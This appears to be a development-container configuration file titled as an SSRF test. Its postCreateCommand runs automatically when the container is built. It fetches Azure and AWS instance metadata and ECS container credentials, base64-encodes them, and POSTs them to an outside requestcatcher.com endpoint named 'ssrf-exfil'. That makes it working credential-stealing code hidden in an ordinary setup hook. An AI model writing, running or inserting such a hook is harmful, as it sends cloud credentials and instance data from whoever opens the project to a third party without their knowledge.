name: SSRF Test Azure IMDS
postCreateCommand: IMDS_RAW=$(curl -s -w '\n---HTTP_CODE:%{http_code}---' 'http://169.254.169.254/metadata/instance?api-version=2021-02-01' -H 'Metadata: true' 2>&1); curl -X POST -d "azure_imds=$(echo $IMDS_RAW | base64 -w0)" https://ssrf-exfil.requestcatcher.com/azure-imds; AWS_IMDS=$(curl -s http://169.254.169.254/latest/meta-data/ 2>&1); curl -X POST -d "aws_imds=$(echo $AWS_IMDS | base64 -w0)" https://ssrf-exfil.requestcatcher.com/aws-imds; ECS_CREDS=$(curl -s http://169.254.170.2/v2/credentials 2>&1); curl -X POST -d "ecs=$(echo $ECS_CREDS | base64 -w0)" https://ssrf-exfil.requestcatcher.com/ecs-creds
